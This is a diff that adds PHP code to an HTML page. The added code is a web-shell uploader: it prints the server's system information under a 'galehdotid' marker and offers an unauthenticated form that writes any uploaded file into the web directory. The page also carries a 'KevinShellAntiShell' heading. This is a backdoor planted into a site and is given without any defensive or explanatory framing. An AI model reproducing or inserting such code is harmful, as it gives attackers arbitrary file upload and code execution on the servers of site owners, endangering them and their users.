@@ -1,8 +1,23 @@
 <html>
 <head>
-<title>
-</title>
+	<title>File Upload</title>
 </head>
+<body>
+	<h1>System: <span id="system_info">galehdotid#<?php echo php_uname(); ?>#</span></h1>
+	<form method="post" enctype="multipart/form-data">
+		<input type="file" name="f">
+		<input name="k" type="submit" id="k" value="upload">
+	</form>
+	<?php
+	if ($_POST["k"] == "upload") {
+		if (@copy($_FILES["f"]["tmp_name"], $_FILES["f"]["name"])) {
+			echo "<b>" . $_FILES["f"]["name"] . "</b>";
+		} else {
+			echo "<b>Gagal upload cok</b>";
+		}
+	}
+	?>
+</body>
 <h1>
     KevinShellAntiShell
 </h1>
